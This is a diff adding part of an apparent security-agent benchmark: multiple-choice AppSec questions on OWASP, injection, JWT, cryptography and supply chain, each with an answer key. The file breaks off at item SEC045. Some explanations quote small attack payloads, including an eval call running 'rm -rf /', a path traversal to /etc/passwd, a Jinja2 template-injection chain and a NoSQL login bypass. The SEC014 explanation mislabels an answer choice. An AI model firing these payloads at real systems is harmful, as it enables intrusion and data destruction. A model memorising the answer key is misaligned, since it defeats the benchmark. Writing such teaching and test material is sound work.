@@ -1,0 +1,1613 @@
+{
+  "agent_id": "security_agent",
+  "source": "Senior AppSec/OWASP/CompTIA Sec+ certification level (professional grade)",
+  "total_questions": 100,
+  "difficulty_distribution": {
+    "intermediate": 20,
+    "advanced": 50,
+    "expert": 30
+  },
+  "multi_step_count": 30,
+  "questions": [
+    {
+      "id": "SEC001",
+      "question": "Which OWASP Top 10 2021 category covers issues like SQL injection, XSS, and command injection?",
+      "choices": {
+        "A": "A01:2021 - Broken Access Control",
+        "B": "A03:2021 - Injection",
+        "C": "A02:2021 - Cryptographic Failures",
+        "D": "A07:2021 - Identification and Authentication Failures"
+      },
+      "answer": "B",
+      "explanation": "A03:2021 - Injection covers SQL injection, XSS (which moved here from its own category), command injection, and other injection flaws. A01 covers access control, A02 covers crypto, and A07 covers authentication.",
+      "topic": "owasp_injection_category",
+      "topic_category": "owasp_top10",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC002",
+      "question": "What is the primary defense against SQL injection attacks?",
+      "choices": {
+        "A": "Escaping single quotes in user input",
+        "B": "Input length validation",
+        "C": "Using a web application firewall (WAF)",
+        "D": "Parameterized queries (prepared statements)"
+      },
+      "answer": "D",
+      "explanation": "Parameterized queries separate SQL code from data, making injection impossible regardless of input content. Input validation and WAFs are defense-in-depth measures but can be bypassed. Escaping is error-prone and encoding-dependent.",
+      "topic": "sql_injection_defense",
+      "topic_category": "injection",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC003",
+      "question": "In the OWASP Top 10 2021, which category rose from #5 to #1?",
+      "choices": {
+        "A": "Security Misconfiguration",
+        "B": "Cryptographic Failures",
+        "C": "Injection",
+        "D": "Broken Access Control"
+      },
+      "answer": "D",
+      "explanation": "Broken Access Control moved from #5 in 2017 to #1 in 2021, reflecting that 94% of applications tested had some form of broken access control. Injection dropped from #1 to #3.",
+      "topic": "owasp_2021_rankings",
+      "topic_category": "owasp_top10",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC004",
+      "question": "Which type of XSS attack stores the malicious payload on the server (e.g., in a database) and serves it to other users?",
+      "choices": {
+        "A": "Self-XSS",
+        "B": "Stored XSS",
+        "C": "DOM-based XSS",
+        "D": "Reflected XSS"
+      },
+      "answer": "B",
+      "explanation": "Stored (persistent) XSS saves the payload server-side and delivers it to every user who views the affected content. Reflected XSS requires the victim to click a crafted link. DOM-based XSS is processed entirely client-side.",
+      "topic": "xss_types",
+      "topic_category": "injection",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC005",
+      "question": "What does the 'SameSite=Strict' cookie attribute prevent?",
+      "choices": {
+        "A": "SQL injection",
+        "B": "XSS attacks",
+        "C": "Cross-site request forgery (CSRF)",
+        "D": "Clickjacking"
+      },
+      "answer": "C",
+      "explanation": "SameSite=Strict prevents the browser from sending the cookie with any cross-site request, which is the mechanism CSRF relies on. XSS is mitigated by HttpOnly and CSP, not SameSite. Clickjacking is mitigated by X-Frame-Options or CSP frame-ancestors.",
+      "topic": "samesite_cookies",
+      "topic_category": "web_headers",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC006",
+      "question": "Which Python function is dangerous because it deserializes arbitrary Python objects, allowing remote code execution?",
+      "choices": {
+        "A": "ast.literal_eval()",
+        "B": "json.loads()",
+        "C": "yaml.safe_load()",
+        "D": "pickle.loads()"
+      },
+      "answer": "D",
+      "explanation": "pickle.loads() can execute arbitrary Python code during deserialization via __reduce__ and other magic methods. json.loads() only produces basic types. yaml.safe_load() restricts to safe types. ast.literal_eval() only evaluates literals.",
+      "topic": "pickle_deserialization",
+      "topic_category": "python_security",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC007",
+      "question": "What is the recommended minimum cost factor (work factor) for bcrypt password hashing in 2024+?",
+      "choices": {
+        "A": "20",
+        "B": "8",
+        "C": "12",
+        "D": "4"
+      },
+      "answer": "C",
+      "explanation": "A cost factor of 12 provides a good balance between security and performance (roughly 250ms per hash). Factor 4 and 8 are too fast for modern hardware. Factor 20 would take minutes per hash, causing denial-of-service on login.",
+      "topic": "bcrypt_cost_factor",
+      "topic_category": "cryptography",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC008",
+      "question": "What is 'dependency confusion' in the context of supply chain security?",
+      "choices": {
+        "A": "Having conflicting versions of the same dependency in a project",
+        "B": "Using outdated dependencies with known CVEs",
+        "C": "Installing dependencies without verifying checksums",
+        "D": "An attacker publishes a higher-versioned package on a public registry with the same name as a private internal package"
+      },
+      "answer": "D",
+      "explanation": "Dependency confusion exploits package managers that check public registries before private ones. An attacker publishes a package with the same name but higher version on PyPI/npm, causing builds to pull the malicious public version instead of the private one.",
+      "topic": "dependency_confusion",
+      "topic_category": "supply_chain",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC009",
+      "question": "Which HTTP response header instructs browsers to only connect to a site via HTTPS for a specified duration?",
+      "choices": {
+        "A": "Content-Security-Policy",
+        "B": "X-Content-Type-Options",
+        "C": "X-Frame-Options",
+        "D": "Strict-Transport-Security"
+      },
+      "answer": "D",
+      "explanation": "Strict-Transport-Security (HSTS) tells browsers to only use HTTPS for future requests to the domain for max-age seconds. CSP controls resource loading. X-Content-Type-Options prevents MIME sniffing. X-Frame-Options prevents clickjacking.",
+      "topic": "hsts_header",
+      "topic_category": "web_headers",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC010",
+      "question": "In the STRIDE threat modeling methodology, what does the 'T' stand for?",
+      "choices": {
+        "A": "Trojan injection",
+        "B": "Tampering",
+        "C": "Traffic analysis",
+        "D": "Token manipulation"
+      },
+      "answer": "B",
+      "explanation": "STRIDE stands for Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege. Tampering refers to unauthorized modification of data or code.",
+      "topic": "stride_methodology",
+      "topic_category": "threat_modeling",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC011",
+      "question": "Which of the following is the correct way to safely execute a shell command in Python without shell injection risk?",
+      "choices": {
+        "A": "os.popen(f'ls {user_input}')",
+        "B": "subprocess.run(['ls', user_input], shell=False)",
+        "C": "subprocess.run(f'ls {user_input}', shell=True)",
+        "D": "os.system(f'ls {user_input}')"
+      },
+      "answer": "B",
+      "explanation": "subprocess.run() with a list argument and shell=False passes arguments directly to the OS without shell interpretation, preventing injection. os.system(), subprocess with shell=True, and os.popen() all pass through the shell, allowing metacharacter injection.",
+      "topic": "subprocess_safety",
+      "topic_category": "python_security",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC012",
+      "question": "What is the purpose of a Content-Security-Policy (CSP) header?",
+      "choices": {
+        "A": "Enforcing authentication on all endpoints",
+        "B": "Preventing SQL injection attacks",
+        "C": "Restricting which sources the browser may load resources from",
+        "D": "Encrypting content between client and server"
+      },
+      "answer": "C",
+      "explanation": "CSP defines an allowlist of sources for scripts, styles, images, fonts, and other resources. It is a primary defense against XSS by preventing execution of inline scripts and scripts from unauthorized origins. It does not handle encryption, SQL injection, or authentication.",
+      "topic": "csp_purpose",
+      "topic_category": "web_headers",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC013",
+      "question": "Which OWASP Top 10 2021 category was newly introduced (not present in 2017)?",
+      "choices": {
+        "A": "A03:2021 - Injection",
+        "B": "A04:2021 - Insecure Design",
+        "C": "A01:2021 - Broken Access Control",
+        "D": "A05:2021 - Security Misconfiguration"
+      },
+      "answer": "B",
+      "explanation": "A04:2021 - Insecure Design is a new category focusing on design flaws and missing security controls, distinguishing implementation bugs from fundamental design weaknesses. The other categories existed in the 2017 version.",
+      "topic": "owasp_2021_new_categories",
+      "topic_category": "owasp_top10",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC014",
+      "question": "What is the main risk of storing secrets (API keys, passwords) in environment variables?",
+      "choices": {
+        "A": "They cannot be rotated without restarting the application",
+        "B": "They are visible to child processes, crash dumps, and /proc on Linux",
+        "C": "Environment variables are always logged to disk",
+        "D": "They are transmitted in plaintext over the network"
+      },
+      "answer": "B",
+      "explanation": "Environment variables are inherited by all child processes, can appear in /proc/<pid>/environ, crash dumps, and debug logs. While rotation requiring restart (C) is a real inconvenience, the primary risk is unintended exposure. They are not inherently logged or transmitted over the network.",
+      "topic": "env_var_secrets_risk",
+      "topic_category": "secrets_management",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC015",
+      "question": "What does the CVSS 'Attack Vector' metric measure?",
+      "choices": {
+        "A": "The type of vulnerability (injection, XSS, etc.)",
+        "B": "The programming language the vulnerability affects",
+        "C": "How far the attacker must be from the vulnerable system to exploit it",
+        "D": "How many steps are required to exploit the vulnerability"
+      },
+      "answer": "C",
+      "explanation": "Attack Vector (AV) measures the context from which exploitation is possible: Network (remote), Adjacent (local network), Local (local access), or Physical. It does not categorize vulnerability type, language, or complexity of exploitation steps.",
+      "topic": "cvss_attack_vector",
+      "topic_category": "supply_chain",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC016",
+      "question": "Which of the following is true about JSON Web Tokens (JWTs)?",
+      "choices": {
+        "A": "The payload of a signed JWT can be read by anyone who has the token",
+        "B": "JWTs cannot be revoked once issued",
+        "C": "JWTs must use RSA for signing",
+        "D": "JWTs are always encrypted"
+      },
+      "answer": "A",
+      "explanation": "A signed JWT (JWS) uses Base64URL encoding, not encryption, so the payload is readable by anyone. JWTs can be encrypted (JWE) but this is not the default. JWTs can be revoked via token blacklists or short expiry. JWTs support HMAC, RSA, and ECDSA.",
+      "topic": "jwt_basics",
+      "topic_category": "auth",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC017",
+      "question": "Why is MD5 unsuitable for password hashing?",
+      "choices": {
+        "A": "It cannot accept inputs longer than 128 bytes",
+        "B": "It requires a secret key",
+        "C": "It is fast, not memory-hard, and has known collision attacks",
+        "D": "It produces a hash that is too short"
+      },
+      "answer": "C",
+      "explanation": "MD5 is designed for speed (millions of hashes per second on modern GPUs), making brute-force trivial. It also has practical collision attacks. Password hashing requires intentionally slow, memory-hard algorithms like bcrypt, scrypt, or Argon2. MD5 produces 128-bit hashes which is fine for integrity, and accepts arbitrary-length inputs.",
+      "topic": "md5_password_hashing",
+      "topic_category": "cryptography",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC018",
+      "question": "What is the primary purpose of a .gitignore entry for '.env' files?",
+      "choices": {
+        "A": "Preventing syntax errors in the repository",
+        "B": "Ensuring environment variables work correctly",
+        "C": "Reducing repository size",
+        "D": "Preventing secrets from being committed to version control"
+      },
+      "answer": "D",
+      "explanation": ".env files typically contain API keys, database credentials, and other secrets. Adding .env to .gitignore prevents accidental commits that would expose these secrets in the repository history. Repository size and syntax are secondary concerns.",
+      "topic": "gitignore_secrets",
+      "topic_category": "secrets_management",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC019",
+      "question": "What is the difference between authentication and authorization?",
+      "choices": {
+        "A": "Authentication happens server-side; authorization happens client-side",
+        "B": "Authentication uses passwords; authorization uses tokens",
+        "C": "Authentication is for users; authorization is for services",
+        "D": "Authentication verifies identity; authorization determines what actions are permitted"
+      },
+      "answer": "D",
+      "explanation": "Authentication (AuthN) verifies who someone is. Authorization (AuthZ) determines what they are allowed to do. Both can use various mechanisms (passwords, tokens, certificates) and happen server-side. Both apply to users and services.",
+      "topic": "authn_vs_authz",
+      "topic_category": "auth",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC020",
+      "question": "Which container security practice limits the impact of a container breakout?",
+      "choices": {
+        "A": "Running containers with a non-root user and read-only filesystem",
+        "B": "Using host network mode",
+        "C": "Mounting the Docker socket inside the container",
+        "D": "Running containers as the root user"
+      },
+      "answer": "A",
+      "explanation": "Running as non-root with a read-only filesystem limits what an attacker can do after a container breakout. Running as root, using host networking, and mounting the Docker socket all increase the blast radius of a compromise.",
+      "topic": "container_least_privilege",
+      "topic_category": "infrastructure",
+      "difficulty": "intermediate",
+      "type": "standard"
+    },
+    {
+      "id": "SEC021",
+      "question": "An application constructs SQL queries like: query = f\"SELECT * FROM users WHERE id = {user_id} AND status = 'active'\". The user_id parameter is validated as an integer. Is this code vulnerable to SQL injection?",
+      "choices": {
+        "A": "No, because integer validation prevents injection",
+        "B": "Yes, because the status value is hardcoded without parameterization",
+        "C": "Yes, because f-strings are always vulnerable to SQL injection",
+        "D": "No, but it is bad practice and should use parameterized queries anyway"
+      },
+      "answer": "D",
+      "explanation": "If user_id is truly validated as an integer before string formatting, injection through that parameter is not possible (integers cannot contain SQL metacharacters). However, this pattern is fragile: future changes might weaken validation, and it teaches bad habits. Parameterized queries should always be used as a defense-in-depth practice.",
+      "topic": "sql_injection_integer_validation",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC022",
+      "question": "What is a 'blind' SQL injection attack?",
+      "choices": {
+        "A": "An injection where the attacker cannot see the database schema",
+        "B": "An injection performed without knowing the database type",
+        "C": "An injection that targets stored procedures instead of direct queries",
+        "D": "An injection where the application does not display query results or errors, so the attacker infers data from application behavior differences"
+      },
+      "answer": "D",
+      "explanation": "Blind SQL injection occurs when the application does not return query results or error messages. The attacker extracts data by observing boolean differences (content-based blind) or time delays (time-based blind) in the application's responses. It does not refer to attacker ignorance of schema or database type.",
+      "topic": "blind_sql_injection",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC023",
+      "question": "In OAuth 2.0, what is the purpose of the PKCE (Proof Key for Code Exchange) extension?",
+      "choices": {
+        "A": "Enabling refresh token rotation",
+        "B": "Encrypting the access token in transit",
+        "C": "Adding multi-factor authentication to OAuth flows",
+        "D": "Preventing authorization code interception attacks on public clients"
+      },
+      "answer": "D",
+      "explanation": "PKCE protects the authorization code grant from interception by using a code_verifier/code_challenge pair. The client generates a random verifier, sends a hash (challenge) in the auth request, and proves possession of the verifier when exchanging the code. This is critical for public clients (SPAs, mobile apps) that cannot securely store a client secret.",
+      "topic": "oauth_pkce",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC024",
+      "question": "What is 'second-order SQL injection'?",
+      "choices": {
+        "A": "An injection that bypasses two layers of input validation",
+        "B": "Malicious input is stored safely but later used unsafely in a different query context",
+        "C": "An injection that requires two separate HTTP requests",
+        "D": "An injection that targets the second database in a replicated setup"
+      },
+      "answer": "B",
+      "explanation": "Second-order (stored) SQL injection occurs when user input is safely stored in the database but later retrieved and used in a dynamically constructed query without parameterization. The initial insert uses prepared statements, but a subsequent operation treats the stored data as trusted and concatenates it into SQL.",
+      "topic": "second_order_sqli",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC025",
+      "question": "Which JWT attack exploits a server that accepts tokens signed with the 'none' algorithm?",
+      "choices": {
+        "A": "JWT none algorithm bypass",
+        "B": "Algorithm confusion attack",
+        "C": "Key injection attack",
+        "D": "Token replay attack"
+      },
+      "answer": "A",
+      "explanation": "The 'none' algorithm bypass occurs when a server's JWT library accepts alg:'none', which means no signature is required. An attacker can forge any token by setting the algorithm to 'none' and removing the signature. Algorithm confusion is a separate attack where the server is tricked into using HMAC with an RSA public key.",
+      "topic": "jwt_none_algorithm",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC026",
+      "question": "What is the vulnerability in this Python code?\n\nimport yaml\nconfig = yaml.load(user_uploaded_file, Loader=yaml.FullLoader)",
+      "choices": {
+        "A": "No vulnerability; yaml.FullLoader is safe",
+        "B": "yaml.FullLoader can still instantiate some Python objects, enabling limited code execution",
+        "C": "The file is not being validated for YAML syntax",
+        "D": "The file path is not being sanitized"
+      },
+      "answer": "B",
+      "explanation": "yaml.FullLoader (default since PyYAML 5.1) blocks most dangerous constructors but still supports some Python-specific tags that can instantiate objects. Only yaml.safe_load() (or yaml.SafeLoader) restricts to basic YAML types. CVE-2020-1747 demonstrated FullLoader bypasses.",
+      "topic": "yaml_fullloader_risk",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC027",
+      "question": "What is the JWT 'algorithm confusion' (key confusion) attack?",
+      "choices": {
+        "A": "Using a deprecated algorithm like HS256 instead of RS256",
+        "B": "Sending a token with an unsupported algorithm to cause a server crash",
+        "C": "Tricking the server into verifying an HMAC-signed token using the RSA public key as the HMAC secret",
+        "D": "Encrypting the token with one algorithm and signing with another"
+      },
+      "answer": "C",
+      "explanation": "In algorithm confusion, the attacker changes alg from RS256 to HS256 and signs the token using the server's RSA public key (which is often publicly available) as the HMAC symmetric secret. If the server naively uses the configured key with the token's stated algorithm, it verifies successfully because HMAC(public_key, payload) matches.",
+      "topic": "jwt_algorithm_confusion",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC028",
+      "question": "What is DOM-based XSS and how does it differ from reflected XSS?",
+      "choices": {
+        "A": "DOM-based XSS only affects Internet Explorer; reflected XSS affects all browsers",
+        "B": "DOM-based XSS payload is processed entirely by client-side JavaScript without server involvement; reflected XSS payload is echoed by the server",
+        "C": "DOM-based XSS requires authentication; reflected XSS does not",
+        "D": "DOM-based XSS targets the server-side DOM; reflected XSS targets the client-side DOM"
+      },
+      "answer": "B",
+      "explanation": "DOM-based XSS occurs when client-side JavaScript reads from a source (e.g., location.hash, document.referrer) and writes to a dangerous sink (e.g., innerHTML, eval) without sanitization. The payload never reaches the server. Reflected XSS requires the server to echo the payload back in the response.",
+      "topic": "dom_based_xss",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC029",
+      "question": "What is the security risk of using Python's eval() function on user input?",
+      "choices": {
+        "A": "It is slower than alternative parsing methods",
+        "B": "It exposes the Python version to the user",
+        "C": "It can execute arbitrary Python code, leading to remote code execution",
+        "D": "It only works with string inputs, causing type errors"
+      },
+      "answer": "C",
+      "explanation": "eval() executes any valid Python expression, including __import__('os').system('rm -rf /'). Even attempts to restrict builtins can be bypassed. Safe alternatives include ast.literal_eval() for literal data structures or purpose-built parsers.",
+      "topic": "eval_rce",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC030",
+      "question": "What is a timing attack in the context of cryptography?",
+      "choices": {
+        "A": "An attack that exploits the time between token issuance and expiry",
+        "B": "An attack that measures execution time differences to infer secret values, such as comparing strings byte-by-byte",
+        "C": "An attack that replays captured packets at specific time intervals",
+        "D": "An attack that exploits timezone differences in distributed systems"
+      },
+      "answer": "B",
+      "explanation": "Timing attacks measure the time taken by operations like string comparison to leak information. If comparing a submitted HMAC to the correct value byte-by-byte with early termination, an attacker can determine the correct value one byte at a time by measuring response times. Constant-time comparison functions (hmac.compare_digest) prevent this.",
+      "topic": "timing_attacks",
+      "topic_category": "cryptography",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC031",
+      "question": "What is Server-Side Template Injection (SSTI) and which template engine is commonly demonstrated in Python SSTI attacks?",
+      "choices": {
+        "A": "Injecting HTML templates into the database; Django templates",
+        "B": "Injecting template syntax that gets evaluated server-side, achieving code execution; Jinja2",
+        "C": "Modifying CSS templates on the server; Mako",
+        "D": "Injecting JavaScript templates into server responses; Chameleon"
+      },
+      "answer": "B",
+      "explanation": "SSTI occurs when user input is embedded directly into a template string and rendered. In Jinja2, an attacker can inject {{config}} to read configuration or traverse the MRO (e.g., ''.__class__.__mro__[1].__subclasses__()) to achieve RCE. The fix is to never pass user input as part of the template string itself.",
+      "topic": "ssti_jinja2",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC032",
+      "question": "What is the difference between a salt and a pepper in password hashing?",
+      "choices": {
+        "A": "A salt is random per-password and stored alongside the hash; a pepper is a secret value stored separately (e.g., in config) and applied to all passwords",
+        "B": "A salt is applied before hashing; a pepper is applied after hashing",
+        "C": "A salt and pepper are the same thing with different names in different frameworks",
+        "D": "A salt is for symmetric encryption; a pepper is for asymmetric encryption"
+      },
+      "answer": "A",
+      "explanation": "A salt is a unique random value per password, stored with the hash, preventing rainbow table attacks. A pepper is a global secret stored outside the database (e.g., in application config or HSM), adding an additional layer so that a database-only breach is insufficient to crack passwords.",
+      "topic": "salt_vs_pepper",
+      "topic_category": "cryptography",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC033",
+      "question": "In a CORS misconfiguration, what is the danger of reflecting the Origin header in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true?",
+      "choices": {
+        "A": "It allows any website to make GET requests to the API",
+        "B": "It disables all browser security headers",
+        "C": "It allows the server to be used as a proxy",
+        "D": "It allows any website to make authenticated requests and read responses, bypassing same-origin policy"
+      },
+      "answer": "D",
+      "explanation": "Reflecting the Origin header with credentials allowed means any website can make cross-origin requests that include cookies/auth headers AND read the responses. This effectively negates the same-origin policy for that endpoint, enabling data theft from authenticated users.",
+      "topic": "cors_misconfiguration",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC034",
+      "question": "What is a lockfile poisoning attack in the context of dependency management?",
+      "choices": {
+        "A": "Encrypting the lockfile with ransomware",
+        "B": "Adding so many dependencies that the lockfile becomes too large to parse",
+        "C": "Modifying the lockfile in a pull request to point to a malicious package version or registry while the diff appears benign",
+        "D": "Corrupting the lockfile to prevent builds from completing"
+      },
+      "answer": "C",
+      "explanation": "Lockfile poisoning involves crafting a PR that modifies the lockfile (package-lock.json, yarn.lock, Pipfile.lock) to resolve to malicious packages while the PR diff appears to only change legitimate dependencies. Reviewers often skip lockfile changes because they appear auto-generated.",
+      "topic": "lockfile_poisoning",
+      "topic_category": "supply_chain",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC035",
+      "question": "Which CSP directive should be used to prevent inline JavaScript execution while allowing scripts from specific domains?",
+      "choices": {
+        "A": "default-src 'none'; script-src *",
+        "B": "script-src 'self' https://cdn.example.com",
+        "C": "script-src 'self' 'unsafe-eval' https://cdn.example.com",
+        "D": "script-src 'self' 'unsafe-inline' https://cdn.example.com"
+      },
+      "answer": "B",
+      "explanation": "script-src 'self' https://cdn.example.com allows scripts only from the same origin and the specified CDN, blocking inline scripts by default. Adding 'unsafe-inline' defeats the XSS protection. 'unsafe-eval' allows eval() which is dangerous. default-src 'none' with script-src * allows scripts from anywhere.",
+      "topic": "csp_script_src",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC036",
+      "question": "What is the purpose of Argon2id compared to Argon2i and Argon2d?",
+      "choices": {
+        "A": "Argon2id uses less memory than Argon2i",
+        "B": "Argon2id supports longer passwords than the other variants",
+        "C": "Argon2id is faster than both variants",
+        "D": "Argon2id combines side-channel resistance (Argon2i) with GPU-cracking resistance (Argon2d) in a hybrid approach"
+      },
+      "answer": "D",
+      "explanation": "Argon2id is a hybrid that uses Argon2i for the first pass (resistant to side-channel attacks like cache-timing) and Argon2d for subsequent passes (resistant to GPU and ASIC cracking). It is the recommended variant for password hashing per RFC 9106.",
+      "topic": "argon2id_hybrid",
+      "topic_category": "cryptography",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC037",
+      "question": "What is a 'transitive dependency' vulnerability and why is it harder to manage?",
+      "choices": {
+        "A": "A vulnerability in a dependency that only manifests during database transactions",
+        "B": "A vulnerability in a dependency of a dependency, which may not be directly visible in the project's dependency file",
+        "C": "A vulnerability that only appears when transitioning between development and production",
+        "D": "A vulnerability that transfers between different programming languages"
+      },
+      "answer": "B",
+      "explanation": "Transitive (indirect) dependencies are pulled in by direct dependencies. A project may list 10 direct dependencies but have 200+ transitive ones. Vulnerabilities in transitive dependencies are harder to detect because they do not appear in requirements.txt/package.json, and fixing them may require waiting for the direct dependency to update.",
+      "topic": "transitive_dependency_risk",
+      "topic_category": "supply_chain",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC038",
+      "question": "What is the security issue with the following Python code?\n\nfrom flask import request\nimport os\n\n@app.route('/download')\ndef download():\n    filename = request.args.get('file')\n    filepath = os.path.join('/app/uploads', filename)\n    return send_file(filepath)",
+      "choices": {
+        "A": "os.path.join is not cross-platform compatible",
+        "B": "Path traversal: an attacker can use '../' sequences to read arbitrary files outside /app/uploads",
+        "C": "The route does not require authentication",
+        "D": "The file is sent without setting Content-Type"
+      },
+      "answer": "B",
+      "explanation": "The filename parameter is user-controlled and not sanitized. An attacker can request ?file=../../../etc/passwd to traverse directories and read arbitrary files. os.path.join does not prevent traversal. The fix is to use os.path.realpath() and verify the resolved path starts with the intended directory.",
+      "topic": "path_traversal_flask",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC039",
+      "question": "What is the Referrer-Policy header 'strict-origin-when-cross-origin' behavior?",
+      "choices": {
+        "A": "Sends the full URL for same-origin requests, only the origin for cross-origin HTTPS requests, and no referer for HTTPS-to-HTTP downgrade",
+        "B": "Only sends Referer to origins listed in a whitelist",
+        "C": "Always sends the full URL as the Referer header",
+        "D": "Never sends any Referer header"
+      },
+      "answer": "A",
+      "explanation": "strict-origin-when-cross-origin sends the full URL (origin+path+query) for same-origin requests, only the origin for cross-origin HTTPS-to-HTTPS requests, and no referer for HTTPS-to-HTTP downgrades. This balances functionality (analytics, navigation) with privacy (not leaking paths cross-origin).",
+      "topic": "referrer_policy",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC040",
+      "question": "In OWASP A08:2021 - Software and Data Integrity Failures, which attack vector was the primary motivation for creating this new category?",
+      "choices": {
+        "A": "Ransomware encryption",
+        "B": "Database corruption",
+        "C": "DNS poisoning",
+        "D": "Supply chain attacks like the SolarWinds compromise"
+      },
+      "answer": "D",
+      "explanation": "A08:2021 was created in response to high-profile supply chain attacks, notably SolarWinds (2020), where attackers compromised the software build pipeline. The category covers insecure CI/CD pipelines, auto-update mechanisms without integrity verification, and deserialization vulnerabilities.",
+      "topic": "owasp_a08_supply_chain",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC041",
+      "question": "What is NoSQL injection and how does it differ from SQL injection?",
+      "choices": {
+        "A": "NoSQL databases are immune to injection because they do not use structured queries",
+        "B": "NoSQL injection targets the filesystem; SQL injection targets databases",
+        "C": "NoSQL injection requires physical access to the database server",
+        "D": "NoSQL injection manipulates query structures (often JSON/BSON operators) rather than SQL syntax to alter query logic"
+      },
+      "answer": "D",
+      "explanation": "NoSQL injection exploits query operators in databases like MongoDB. For example, injecting {\"$gt\": \"\"} into a password field bypasses authentication because $gt:'' is always true. The attack surface is different from SQL (JSON operators vs SQL syntax) but the principle of untrusted data altering query logic is the same.",
+      "topic": "nosql_injection",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC042",
+      "question": "What is the CWE identifier for 'Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)'?",
+      "choices": {
+        "A": "CWE-89",
+        "B": "CWE-79",
+        "C": "CWE-352",
+        "D": "CWE-22"
+      },
+      "answer": "A",
+      "explanation": "CWE-89 is SQL Injection. CWE-79 is Cross-site Scripting (XSS). CWE-22 is Path Traversal. CWE-352 is Cross-Site Request Forgery (CSRF). These CWE identifiers are standardized weakness enumerations used across vulnerability databases.",
+      "topic": "cwe_sql_injection",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC043",
+      "question": "What is the security risk of Python's format string vulnerability in older-style string formatting?\n\nuser_input = request.args.get('name')\ntemplate = 'Hello, {}! Your config is: {.__class__.__init__.__globals__}'\nresult = template.format(user_input, user_input)",
+      "choices": {
+        "A": "It only affects Python 2, not Python 3",
+        "B": "It causes a syntax error",
+        "C": "The format specifier can access attributes and internal state of the passed object, leaking sensitive data or enabling further exploitation",
+        "D": "The format string is too long for the buffer"
+      },
+      "answer": "C",
+      "explanation": "Python's str.format() allows attribute access on passed objects via {0.__class__} syntax. An attacker can traverse object attributes to access __globals__, leaking configuration, secret keys, or database credentials. This affects Python 3's str.format() as well. The fix is to never use user input as the format string itself.",
+      "topic": "python_format_string",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC044",
+      "question": "What is a padding oracle attack?",
+      "choices": {
+        "A": "An attack that adds extra padding to HTTP requests to cause buffer overflows",
+        "B": "An attack that pads database fields to bypass length validation",
+        "C": "An attack that uses extra bytes in JWT tokens to bypass signature validation",
+        "D": "An attack that exploits error messages from decryption to determine whether the padding of a ciphertext block is valid, enabling plaintext recovery"
+      },
+      "answer": "D",
+      "explanation": "A padding oracle attack exploits systems using CBC-mode block ciphers that reveal whether decrypted padding is valid (e.g., via different error codes or timing). By systematically modifying ciphertext bytes and observing responses, an attacker can decrypt the entire message without the key. Mitigations include authenticated encryption (GCM) and constant-time error handling.",
+      "topic": "padding_oracle",
+      "topic_category": "cryptography",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC045",
